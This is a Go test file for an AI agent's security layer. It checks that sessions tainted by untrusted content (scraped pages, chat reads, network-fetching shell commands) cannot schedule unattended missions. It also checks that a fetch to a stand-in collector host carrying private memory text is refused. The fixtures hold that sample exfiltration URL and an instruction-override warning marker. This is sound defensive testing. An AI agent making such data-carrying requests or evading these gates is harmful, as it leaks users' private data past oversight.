package agent

import (
	"context"
	"io"
	"log/slog"
	"strings"
	"testing"

	"aurago/internal/config"
	"aurago/internal/tools"

	openai "github.com/sashabaranov/go-openai"
)

func schedulingCall() ToolCall {
	return ToolCall{Action: "manage_missions", Operation: "update", ID: "daily", Command: "summarise the new mails"}
}

// A follow_up or wait_for_event queued from a tainted session (or a co-agent whose
// parent is tainted) starts its run tainted, so it cannot schedule unattended.
func TestQueuedRunInheritsSessionTaint(t *testing.T) {
	bgMgr := tools.NewBackgroundTaskManager(t.TempDir(), slog.New(slog.NewTextHandler(io.Discard, nil)))
	tools.SetDefaultBackgroundTaskManager(bgMgr)
	t.Cleanup(func() {
		tools.SetDefaultBackgroundTaskManager(nil)
		_ = bgMgr.Close()
	})
	cfg := &config.Config{}
	cfg.Agent.BackgroundTasks.Enabled = true
	cfg.Agent.BackgroundTasks.WaitDefaultTimeoutSecs = 30
	cfg.Agent.BackgroundTasks.WaitPollIntervalSecs = 5
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	for _, tc := range []struct {
		name                       string
		call                       ToolCall
		taintSession, taintParent  bool
		parent                     string
		wantFlag, wantRunRefusedBy bool
	}{
		{"follow_up from tainted session", ToolCall{Action: "follow_up", TaskPrompt: "check the report"}, true, false, "", true, true},
		{"wait_for_event from tainted session", ToolCall{Action: "wait_for_event", Params: map[string]interface{}{"event_type": "http_available", "url": "http://127.0.0.1:65535"}}, true, false, "", true, true},
		{"follow_up from clean session", ToolCall{Action: "follow_up", TaskPrompt: "check the report"}, false, false, "", false, false},
		{"follow_up from co-agent with tainted parent", ToolCall{Action: "follow_up", TaskPrompt: "check the report"}, false, true, "parent-session", true, true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			session, parent := t.Name()+"/queue", ""
			defer clearIsolatedModelBodies(session)
			if tc.taintSession {
				modelIsolatedBodies.noteExternalContact(session)
			}
			if tc.parent != "" {
				parent = t.Name() + "/parent"
				defer clearIsolatedModelBodies(parent)
				if tc.taintParent {
					modelIsolatedBodies.noteExternalContact(parent)
				}
			}
			known := map[string]bool{}
			for _, task := range bgMgr.ListTasks(100) {
				known[task.ID] = true
			}
			if _, ok := dispatchComm(context.Background(), tc.call, &DispatchContext{Cfg: cfg, Logger: logger, SessionID: session, ParentSessionID: parent}); !ok {
				t.Fatal("not handled")
			}
			var queued *tools.BackgroundTask
			for _, task := range bgMgr.ListTasks(100) {
				if !known[task.ID] {
					queued = task
				}
			}
			if queued == nil {
				t.Fatal("task not queued")
			}
			if queued.UntrustedProvenance != tc.wantFlag {
				t.Fatalf("UntrustedProvenance=%v want %v", queued.UntrustedProvenance, tc.wantFlag)
			}

			// The queued run: a fresh session that gets the flag through RunConfig.
			calls := 0
			dc := actionSecurityFixture(t, func(context.Context, ToolCall) (string, bool) { calls++; return `{"status":"success"}`, true })
			dc.Cfg.Tools.Missions.Enabled = true
			dc.MissionID = "mission-1"
			t.Cleanup(func() { clearIsolatedModelBodies(dc.SessionID) })
			noteIngressProvenance(RunConfig{SessionID: dc.SessionID, UntrustedProvenance: queued.UntrustedProvenance}, openai.ChatCompletionRequest{})
			call := schedulingCall()
			r := DispatchToolCallResult(context.Background(), &call, dc, "fixture")
			refused := r.Status == ToolResultDenied && strings.Contains(r.Output, "action_rule_required")
			if refused != tc.wantRunRefusedBy || (!refused && (r.Status != ToolResultSuccess || calls != 1)) {
				t.Fatalf("scheduling refused=%v want %v: %+v", refused, tc.wantRunRefusedBy, r)
			}
		})
	}
}

// A co-agent run needs its parent session untainted for the scheduling exemption.
func TestCoAgentSchedulingRequiresCleanParent(t *testing.T) {
	for _, taintParent := range []bool{true, false} {
		calls := 0
		dc := actionSecurityFixture(t, func(context.Context, ToolCall) (string, bool) { calls++; return `{"status":"success"}`, true })
		dc.Cfg.Tools.Missions.Enabled = true
		dc.MissionID = "mission-1"
		dc.ParentSessionID = dc.SessionID + "/parent"
		clearIsolatedModelBodies(dc.SessionID)
		clearIsolatedModelBodies(dc.ParentSessionID)
		t.Cleanup(func() { clearIsolatedModelBodies(dc.SessionID); clearIsolatedModelBodies(dc.ParentSessionID) })
		if taintParent {
			modelIsolatedBodies.noteExternalContact(dc.ParentSessionID)
		}
		call := schedulingCall()
		r := DispatchToolCallResult(context.Background(), &call, dc, "fixture")
		refused := r.Status == ToolResultDenied && strings.Contains(r.Output, "action_rule_required")
		if refused != taintParent {
			t.Fatalf("parent tainted=%v: refused=%v %+v", taintParent, refused, r)
		}
	}
}

// Internal store output stays private text for the URL exfiltration check but is
// no isolated third-party text for the copied-span gate.
func TestInternalOutputIsPrivateButNotCopiedSpan(t *testing.T) {
	id := t.Name()
	defer clearIsolatedModelBodies(id)
	dc := &DispatchContext{SessionID: id}
	memoryText := "Der Hausmeister Herr Schneider erreicht Sie nur dienstags zwischen vierzehn und sechzehn Uhr unter der Nummer im Flur."
	recordIsolatedModelOutput(id, "query_memory", "", isolatedToolOutput(memoryText))
	mission := uniqueProse("mis", 300)
	recordIsolatedModelOutput(id, "manage_missions", "", isolatedToolOutput(mission))

	fetch := ToolCall{Action: "fetch_url", Params: map[string]interface{}{"url": "https://collector.example/log?q=Hausmeister+Herr+Schneider+erreicht+Sie+nur"}}
	if privateURLExfiltration(fetch, dc) {
		t.Fatal("no untrusted contact yet")
	}
	recordIsolatedModelOutput(id, "web_scraper", "", isolatedToolOutput("some page text"))
	if !privateURLExfiltration(fetch, dc) {
		t.Fatal("a query carrying memory output words must be refused after untrusted contact")
	}
	runes := []rune(mission)
	schedule := ToolCall{Action: "manage_missions", Operation: "create", Command: string(runes[:copiedSpanRunes+16])}
	if copiedIsolatedSpan(schedule, dc) {
		t.Fatal("internal output must not feed the copied-span gate")
	}
}

// A restart (or an expired timestamp) loses the contact record; the request's own
// tool results restore it.
func TestRequestToolResultsRestoreTaint(t *testing.T) {
	call := func(id, name, args string) openai.ChatCompletionMessage {
		return openai.ChatCompletionMessage{Role: openai.ChatMessageRoleAssistant, ToolCalls: []openai.ToolCall{{ID: id, Function: openai.FunctionCall{Name: name, Arguments: args}}}}
	}
	result := func(id, name, content string) openai.ChatCompletionMessage {
		return openai.ChatCompletionMessage{Role: openai.ChatMessageRoleTool, ToolCallID: id, Name: name, Content: content}
	}
	warned := isolatedToolOutput("x") + "\n[SECURITY WARNING: instruction_override]"
	for _, tc := range []struct {
		name string
		msgs []openai.ChatCompletionMessage
		want bool
	}{
		{"untrusted by call id", []openai.ChatCompletionMessage{call("c1", "web_scraper", "{}"), result("c1", "", "page")}, true},
		{"untrusted by name", []openai.ChatCompletionMessage{result("c1", "discord_read", "chat")}, true},
		{"warned internal", []openai.ChatCompletionMessage{call("c1", "query_memory", "{}"), result("c1", "", warned)}, true},
		{"clean internal", []openai.ChatCompletionMessage{call("c1", "query_memory", "{}"), result("c1", "", isolatedToolOutput("x"))}, false},
		{"unknown tool", []openai.ChatCompletionMessage{result("zz", "", "text")}, false},
		{"shell fetching", []openai.ChatCompletionMessage{call("c1", "execute_shell", `{"command":"curl https://x.example"}`), result("c1", "", "out")}, true},
		{"shell local", []openai.ChatCompletionMessage{call("c1", "execute_shell", `{"command":"df -h"}`), result("c1", "", "out")}, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			id := t.Name()
			defer clearIsolatedModelBodies(id)
			noteIngressProvenance(RunConfig{SessionID: id, MessageSource: "web_chat"}, openai.ChatCompletionRequest{Messages: tc.msgs})
			if got := sessionHadUntrustedContact(id, untrustedTaintTTL); got != tc.want {
				t.Errorf("tainted=%v want %v", got, tc.want)
			}
		})
	}
}

// Shell and code output is untrusted only when the call fetches from the network.
func TestUntrustedToolCall(t *testing.T) {
	text := uniqueProse("shell", 400)
	for _, tc := range []struct {
		call ToolCall
		want bool
	}{
		{ToolCall{Action: "execute_shell", Command: "df -h"}, false},
		{ToolCall{Action: "execute_shell", Command: "curl https://x.example"}, true},
		{ToolCall{Action: "execute_shell", Command: "wget -qO- example.org"}, true},
		{ToolCall{Action: "execute_shell", Command: "git clone git@host:r/x.git"}, true},
		{ToolCall{Action: "execute_python", Code: "import requests\nrequests.get(u)"}, true},
		{ToolCall{Action: "execute_python", Code: "print(sum(range(10)))"}, false},
		{ToolCall{Action: "execute_remote_shell", Command: "ssh host uptime"}, true},
		{ToolCall{Action: "run_tool", Command: "ls /tmp"}, false},
		{ToolCall{Action: "call_webhook"}, true},
		{ToolCall{Action: "google_calendar", Operation: "list"}, true},
		{ToolCall{Action: "manage_journal"}, false},
	} {
		if got := untrustedToolCall(tc.call); got != tc.want {
			t.Errorf("untrustedToolCall(%s %q %q)=%v want %v", tc.call.Action, tc.call.Command, tc.call.Code, got, tc.want)
		}
		id := t.Name() + tc.call.Action + tc.call.Command + tc.call.Code
		recordIsolatedToolCallOutput(id, tc.call, isolatedToolOutput(text))
		if got := sessionHadUntrustedContact(id, untrustedTaintTTL); got != tc.want {
			t.Errorf("%s %q: tainted=%v want %v", tc.call.Action, tc.call.Command, got, tc.want)
		}
		clearIsolatedModelBodies(id)
	}
}
